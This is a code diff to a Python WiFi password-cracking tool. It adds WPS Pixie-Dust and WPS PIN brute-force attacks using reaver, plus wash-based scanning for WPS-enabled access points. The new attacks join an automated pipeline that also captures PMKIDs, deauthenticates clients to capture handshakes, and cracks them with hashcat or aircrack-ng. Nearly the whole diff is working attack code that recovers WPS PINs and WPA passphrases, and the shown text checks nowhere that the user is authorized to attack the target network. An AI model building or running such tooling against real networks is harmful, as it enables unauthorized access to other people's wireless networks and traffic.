@@ -1,14 +1,16 @@
 """WPA/WPA2/WPA3 password cracking module.
 
-Orchestrates: hcxdumptool, hcxpcapngtool, hashcat, aircrack-ng.
+Orchestrates: hcxdumptool, hcxpcapngtool, hashcat, aircrack-ng, reaver, wash.
 Does NOT implement crypto -- wraps proven tools.
 
 Techniques (ordered by effectiveness):
  1. PMKID capture      -- client-less, extract PMKID from AP's first message (~60% of APs)
- 2. Handshake capture  -- deauth a client, capture 4-way handshake
+ 2. WPS Pixie-Dust     -- exploits weak RNG in WPS (~30% of WPS-enabled APs, 5-30s)
  3. Hashcat crack      -- GPU-accelerated cracking (PMKID or handshake)
- 4. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)
- 5. Online brute force -- modified wpa_supplicant (very slow, last resort)
+ 4. Handshake capture  -- deauth a client, capture 4-way handshake
+ 5. Hashcat crack      -- GPU-accelerated cracking of handshake
+ 6. WPS PIN brute      -- brute force 8-digit WPS PIN (2-10 hours, last resort)
+ 7. Dictionary attack  -- wordlist-based cracking via aircrack-ng (CPU fallback)
 
 On macOS, monitor mode requires a compatible external USB WiFi adapter.
 The built-in card does not support it. The module reports this clearly
@@ -37,6 +39,8 @@ class CrackMethod(Enum):
     HASHCAT = "hashcat_crack"
     DICTIONARY = "dictionary_attack"
     ONLINE_BRUTE = "online_brute_force"
+    WPS_PIXIE = "wps_pixie_dust"
+    WPS_PIN = "wps_pin_brute"
 
 
 @dataclass
@@ -47,6 +51,9 @@ class WifiTarget:
     security: str  # WPA2, WPA3, WEP, Open
     signal: int  # dBm
     clients: list[str] = field(default_factory=list)  # client MACs
+    wps_enabled: bool = False
+    wps_locked: bool = False
+    wps_version: str = ""
 
 
 @dataclass
@@ -140,6 +147,24 @@ def find_airodump() -> str:
 def find_aireplay() -> str:
     """Find aireplay-ng binary."""
     return _find_tool("aireplay-ng", "brew install aircrack-ng  OR  apt install aircrack-ng")
+
+
+def find_reaver() -> str:
+    """Find reaver binary."""
+    from .toolchain import find_tool
+    path = find_tool("reaver")
+    if path:
+        return path
+    raise ToolNotFound("reaver", "brew install reaver  OR  apt install reaver")
+
+
+def find_wash() -> str:
+    """Find wash binary (part of reaver package, detects WPS-enabled APs)."""
+    from .toolchain import find_tool
+    path = find_tool("wash")
+    if path:
+        return path
+    raise ToolNotFound("wash", "Installed with reaver: brew install reaver")
 
 
 # ---------------------------------------------------------------------------
@@ -768,6 +793,404 @@ def _capture_handshake_aircrack(
 
 
 # ---------------------------------------------------------------------------
+# WPS scanning and attacks
+# ---------------------------------------------------------------------------
+
+def scan_wps_targets(interface: str, timeout: int = 15) -> list[WifiTarget]:
+    """Scan for WPS-enabled access points using wash.
+
+    wash -i {interface} -s  (requires monitor mode)
+    Parse output: BSSID, channel, RSSI, WPS version, WPS locked, ESSID
+
+    Falls back to reaver --wash mode if wash binary is unavailable.
+
+    Args:
+        interface: Monitor-mode interface name.
+        timeout: Seconds to scan before stopping wash.
+
+    Returns:
+        List of WifiTarget with wps_enabled=True for APs that advertise WPS.
+    """
+    targets: list[WifiTarget] = []
+
+    # Try wash first (preferred, part of reaver package)
+    wash_path: str | None = None
+    try:
+        wash_path = find_wash()
+    except ToolNotFound:
+        pass
+
+    if wash_path:
+        proc = subprocess.Popen(
+            [wash_path, "-i", interface, "-s"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        try:
+            proc.wait(timeout=timeout)
+        except subprocess.TimeoutExpired:
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+
+        stdout_data = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
+        targets = _parse_wash_output(stdout_data)
+        if targets:
+            return targets
+
+    # Fallback: reaver with --wash flag (same output format)
+    try:
+        reaver_path = find_reaver()
+    except ToolNotFound:
+        return targets
+
+    proc = subprocess.Popen(
+        [reaver_path, "-i", interface, "--wash"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        proc.wait(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.terminate()
+        try:
+            proc.wait(timeout=5)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+
+    stdout_data = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
+    targets = _parse_wash_output(stdout_data)
+    return targets
+
+
+def _parse_wash_output(output: str) -> list[WifiTarget]:
+    """Parse wash/reaver --wash output into WifiTarget list.
+
+    Typical wash output format:
+    BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
+    AA:BB:CC:DD:EE:FF    6  -45  1.0  No   RalinkTe  MyNetwork
+    """
+    targets: list[WifiTarget] = []
+    for line in output.splitlines():
+        line = line.strip()
+        if not line or line.startswith("BSSID") or line.startswith("---"):
+            continue
+
+        bssid_match = _BSSID_RE.match(line)
+        if not bssid_match:
+            continue
+
+        bssid = bssid_match.group(0)
+        remainder = line[len(bssid):].strip()
+        parts = remainder.split()
+
+        if len(parts) < 5:
+            continue
+
+        try:
+            channel = int(parts[0])
+            signal = int(parts[1])
+        except (ValueError, IndexError):
+            continue
+
+        wps_version = parts[2] if len(parts) > 2 else ""
+        wps_locked = parts[3].lower() == "yes" if len(parts) > 3 else False
+        # ESSID is everything after the vendor field (parts[5:])
+        # vendor is parts[4], ESSID is parts[5:]
+        essid = " ".join(parts[5:]) if len(parts) > 5 else ""
+
+        targets.append(WifiTarget(
+            ssid=essid,
+            bssid=bssid,
+            channel=channel,
+            security="WPA/WPA2",  # WPS implies WPA
+            signal=signal,
+            wps_enabled=True,
+            wps_locked=wps_locked,
+            wps_version=wps_version,
+        ))
+
+    return targets
+
+
+def crack_wps_pixie(
+    target: WifiTarget,
+    interface: str,
+    output_dir: Path | None = None,
+    timeout: int = 300,
+) -> CrackResult:
+    """WPS Pixie-Dust attack using reaver.
+
+    reaver -i {interface} -b {bssid} -c {channel} -K 1 -vv
+
+    Exploits weak random number generation in WPS implementations.
+    Takes 5-30 seconds when vulnerable (vs hours for PIN brute force).
+    Approximately 30% of WPS-enabled APs are vulnerable.
+
+    Args:
+        target: WiFi target (should have wps_enabled=True).
+        interface: Monitor-mode capable interface.
+        output_dir: Directory for output files.
+        timeout: Seconds to wait (Pixie-Dust is fast, 300s is generous).
+
+    Returns:
+        CrackResult with password if the WPS PIN and WPA PSK were recovered.
+    """
+    start_time = time.monotonic()
+    result = CrackResult(method=CrackMethod.WPS_PIXIE, success=False)
+
+    if output_dir is None:
+        output_dir = _timestamped_dir("wps_pixie")
+
+    # Check monitor mode
+    if not _check_monitor_mode(interface):
+        if _is_macos():
+            result.details = (
+                "Monitor mode not available. macOS built-in WiFi does not support "
+                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
+            )
+        else:
+            result.details = (
+                f"Interface {interface} is not in monitor mode. "
+                f"Run: sudo airmon-ng start {interface}"
+            )
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Find reaver
+    try:
+        reaver_path = find_reaver()
+    except ToolNotFound as e:
+        result.details = str(e)
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Skip if WPS is known to be locked
+    if target.wps_locked:
+        result.details = f"WPS is locked on {target.ssid} ({target.bssid}) -- skipping Pixie-Dust"
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Build reaver command: Pixie-Dust mode (-K 1)
+    cmd = [
+        reaver_path,
+        "-i", interface,
+        "-b", target.bssid,
+        "-c", str(target.channel),
+        "-K", "1",       # Pixie-Dust attack
+        "-vv",           # Verbose output for parsing
+    ]
+
+    output_file = output_dir / "reaver_pixie.log"
+
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+    )
+
+    try:
+        stdout_data, _ = proc.communicate(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.terminate()
+        try:
+            proc.wait(timeout=10)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+        stdout_data = proc.stdout.read() if proc.stdout else b""
+
+    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""
+
+    # Save log
+    output_file.write_text(stdout_text)
+
+    # Parse reaver output for WPS PIN and WPA PSK
+    wps_pin, wpa_psk = _parse_reaver_output(stdout_text)
+
+    if wpa_psk:
+        result.success = True
+        result.password = wpa_psk
+        result.details = f"Pixie-Dust recovered WPA PSK from {target.ssid} (WPS PIN: {wps_pin})"
+        result.capture_file = str(output_file)
+    elif wps_pin:
+        result.success = True
+        result.password = ""
+        result.details = f"Pixie-Dust recovered WPS PIN: {wps_pin} (but no PSK in output)"
+        result.capture_file = str(output_file)
+    else:
+        # Check for common failure reasons
+        if "WPS transaction failed" in stdout_text:
+            result.details = "WPS transaction failed -- AP may have rate limiting"
+        elif "WPS pin not found" in stdout_text or "Failed to recover" in stdout_text:
+            result.details = "Pixie-Dust failed -- AP not vulnerable to weak RNG attack"
+        else:
+            result.details = f"Pixie-Dust did not recover credentials. {stdout_text[-200:]}"
+
+    result.time_elapsed = time.monotonic() - start_time
+    return result
+
+
+def crack_wps_pin(
+    target: WifiTarget,
+    interface: str,
+    output_dir: Path | None = None,
+    timeout: int = 3600,
+) -> CrackResult:
+    """WPS PIN brute force using reaver.
+
+    reaver -i {interface} -b {bssid} -c {channel} -vv
+
+    Brute forces the 8-digit WPS PIN (effectively 11000 combinations due to
+    checksum digit + split verification). Can take 2-10 hours.
+    Only use as last resort.
+
+    Args:
+        target: WiFi target (should have wps_enabled=True).
+        interface: Monitor-mode capable interface.
+        output_dir: Directory for output files.
+        timeout: Max seconds for brute force (default 3600 = 1 hour).
+
+    Returns:
+        CrackResult with password if the WPS PIN and WPA PSK were recovered.
+    """
+    start_time = time.monotonic()
+    result = CrackResult(method=CrackMethod.WPS_PIN, success=False)
+
+    if output_dir is None:
+        output_dir = _timestamped_dir("wps_pin")
+
+    # Check monitor mode
+    if not _check_monitor_mode(interface):
+        if _is_macos():
+            result.details = (
+                "Monitor mode not available. macOS built-in WiFi does not support "
+                "monitor mode. Use an external USB WiFi adapter (e.g., Alfa AWUS036ACH)."
+            )
+        else:
+            result.details = (
+                f"Interface {interface} is not in monitor mode. "
+                f"Run: sudo airmon-ng start {interface}"
+            )
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Find reaver
+    try:
+        reaver_path = find_reaver()
+    except ToolNotFound as e:
+        result.details = str(e)
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Skip if WPS is known to be locked
+    if target.wps_locked:
+        result.details = f"WPS is locked on {target.ssid} ({target.bssid}) -- PIN brute force blocked"
+        result.time_elapsed = time.monotonic() - start_time
+        return result
+
+    # Build reaver command: full PIN brute force (no -K flag)
+    cmd = [
+        reaver_path,
+        "-i", interface,
+        "-b", target.bssid,
+        "-c", str(target.channel),
+        "-vv",           # Verbose output for parsing
+        "-d", "2",       # 2 second delay between PINs (avoid lockout)
+        "-N",            # Don't send NACK packets (more reliable)
+    ]
+
+    output_file = output_dir / "reaver_pin.log"
+
+    proc = subprocess.Popen(
+        cmd,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+    )
+
+    try:
+        stdout_data, _ = proc.communicate(timeout=timeout)
+    except subprocess.TimeoutExpired:
+        proc.terminate()
+        try:
+            proc.wait(timeout=10)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+        stdout_data = proc.stdout.read() if proc.stdout else b""
+
+    stdout_text = stdout_data.decode(errors="replace") if stdout_data else ""
+
+    # Save log
+    output_file.write_text(stdout_text)
+
+    # Parse reaver output
+    wps_pin, wpa_psk = _parse_reaver_output(stdout_text)
+
+    if wpa_psk:
+        result.success = True
+        result.password = wpa_psk
+        result.details = f"WPS PIN brute force recovered PSK from {target.ssid} (PIN: {wps_pin})"
+        result.capture_file = str(output_file)
+    elif wps_pin:
+        result.success = True
+        result.password = ""
+        result.details = f"WPS PIN recovered: {wps_pin} (but no PSK in output)"
+        result.capture_file = str(output_file)
+    else:
+        if "WPS pin not found" in stdout_text:
+            result.details = "WPS PIN brute force exhausted all PINs without success"
+        elif "locked" in stdout_text.lower():
+            result.details = "AP locked WPS after too many attempts"
+        elif proc.returncode is not None and proc.returncode != 0:
+            result.details = f"Reaver exited with code {proc.returncode}. {stdout_text[-200:]}"
+        else:
+            result.details = f"WPS PIN brute force timed out after {timeout}s"
+
+    result.time_elapsed = time.monotonic() - start_time
+    return result
+
+
+def _parse_reaver_output(output: str) -> tuple[str, str]:
+    """Parse reaver stdout for WPS PIN and WPA PSK.
+
+    Reaver prints:
+      [+] WPS PIN: '12345670'
+      [+] WPA PSK: 'MyPassword123'
+      or
+      [+] Pin cracked in X seconds
+      [+] WPS PIN: XXXXXXXX
+      [+] AP SSID: NetworkName
+      [+] WPA PSK: password
+
+    Returns:
+        Tuple of (wps_pin, wpa_psk). Either or both may be empty string.
+    """
+    wps_pin = ""
+    wpa_psk = ""
+
+    for line in output.splitlines():
+        line = line.strip()
+
+        # Match WPS PIN
+        pin_match = re.search(r"WPS PIN:\s*'?([0-9]{4,8})'?", line)
+        if pin_match:
+            wps_pin = pin_match.group(1)
+
+        # Match WPA PSK
+        psk_match = re.search(r"WPA PSK:\s*'(.+?)'", line)
+        if psk_match:
+            wpa_psk = psk_match.group(1)
+        elif "WPA PSK:" in line:
+            # Unquoted PSK
+            psk_part = line.split("WPA PSK:", 1)[1].strip()
+            if psk_part:
+                wpa_psk = psk_part
+
+    return wps_pin, wpa_psk
+
+
+# ---------------------------------------------------------------------------
 # Hashcat cracking
 # ---------------------------------------------------------------------------
 
@@ -1034,14 +1457,14 @@ def run_crack(
 ) -> list[CrackResult]:
     """Run full cracking pipeline against a target.
 
-    Pipeline:
-    1. Scan for WiFi targets
-    2. Select target (by SSID or strongest signal)
-    3. Try PMKID capture (no clients needed, ~60% of APs)
-    4. If PMKID captured, crack with hashcat
-    5. If no PMKID, try handshake capture (needs connected clients)
-    6. If handshake captured, crack with hashcat
-    7. Fall back to aircrack-ng if hashcat unavailable
+    Pipeline (ordered by speed and effectiveness):
+    1. PMKID capture       -- client-less, ~60% of APs vulnerable
+    2. WPS Pixie-Dust      -- fast (5-30s), ~30% of WPS-enabled APs
+    3. Hashcat crack PMKID -- GPU-accelerated dictionary/brute
+    4. Handshake capture   -- needs connected clients
+    5. Hashcat crack handshake
+    6. WPS PIN brute force -- slow (2-10h), last resort
+    7. Aircrack-ng         -- CPU fallback if hashcat unavailable
 
     Args:
         interface: WiFi interface (monitor-mode capable for capture).
@@ -1087,12 +1510,33 @@ def run_crack(
         else:
             target = targets[0]
 
+    # Enrich target with WPS info if not already set
+    if not target.wps_enabled:
+        try:
+            wps_targets = scan_wps_targets(interface, timeout=10)
+            for wt in wps_targets:
+                if wt.bssid.lower() == target.bssid.lower():
+                    target.wps_enabled = wt.wps_enabled
+                    target.wps_locked = wt.wps_locked
+                    target.wps_version = wt.wps_version
+                    break
+        except Exception:
+            pass  # WPS scan is best-effort
+
     # Step 3: Try PMKID capture (client-less, most effective)
     pmkid_result = capture_pmkid(target, interface, timeout=timeout)
     results.append(pmkid_result)
 
+    # Step 4: WPS Pixie-Dust (fast, try before slow hashcat)
+    if target.wps_enabled and not target.wps_locked:
+        pixie_result = crack_wps_pixie(target, interface, timeout=min(timeout, 300))
+        results.append(pixie_result)
+
+        if pixie_result.success and pixie_result.password:
+            return results
+
+    # Step 5: Crack PMKID with hashcat (if captured)
     if pmkid_result.success and pmkid_result.capture_file:
-        # Step 4: Crack PMKID with hashcat
         crack_result = crack_with_hashcat(
             pmkid_result.capture_file,
             attack_mode="dictionary",
@@ -1120,12 +1564,12 @@ def run_crack(
         if aircrack_result.success:
             return results
 
-    # Step 5: Try handshake capture (needs clients)
+    # Step 6: Try handshake capture (needs clients)
     handshake_result = capture_handshake(target, interface, timeout=timeout)
     results.append(handshake_result)
 
     if handshake_result.success and handshake_result.capture_file:
-        # Step 6: Crack handshake with hashcat
+        # Step 7: Crack handshake with hashcat
         crack_result = crack_with_hashcat(
             handshake_result.capture_file,
             attack_mode="dictionary",
@@ -1149,5 +1593,13 @@ def run_crack(
         # Aircrack-ng fallback
         aircrack_result = crack_with_aircrack(handshake_result.capture_file, wordlist)
         results.append(aircrack_result)
+
+        if aircrack_result.success:
+            return results
+
+    # Step 8: WPS PIN brute force (slow, last resort -- 2-10 hours)
+    if target.wps_enabled and not target.wps_locked:
+        pin_result = crack_wps_pin(target, interface, timeout=min(timeout * 4, 3600))
+        results.append(pin_result)
 
     return results
